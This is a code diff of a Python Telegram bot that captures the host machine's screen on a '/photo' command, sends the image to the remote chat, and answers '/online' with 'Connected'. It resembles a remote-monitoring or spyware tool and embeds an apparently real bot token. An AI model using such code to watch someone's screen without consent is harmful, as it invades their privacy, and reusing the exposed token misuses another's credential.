@@ -5,7 +5,6 @@ import os
 import os.path
 
 bot = telebot.TeleBot("1334401569:AAF72wWqcQjpCY7o-BcfKfV420tBcqnXM0g")
-
 @bot.message_handler(content_types=['text'])
 def message_photo(message):
 	if message.text == "/photo":
@@ -29,8 +28,13 @@ def message_photo(message):
 		scr = os.path.isfile("screenshot.png")
 		if scr == True:
 			os.remove("screenshot.png")
-		pyautogui.screenshot("screenshot.png")
-		screen = open("screenshot.png", "rb")
-		bot.send_photo(message.chat.id, screen)
-                        
+			pyautogui.screenshot("screenshot.png")
+			screen = open("screenshot.png", "rb")
+			bot.send_photo(message.chat.id, screen)
+		elif scr == False:	
+			pyautogui.screenshot("screenshot.png")
+			screen = open("screenshot.png", "rb")
+			bot.send_photo(message.chat.id, screen)
+	elif message.text == "/online":
+		bot.send_message(message.chat.id, "Connected")
 bot.polling(none_stop=True)
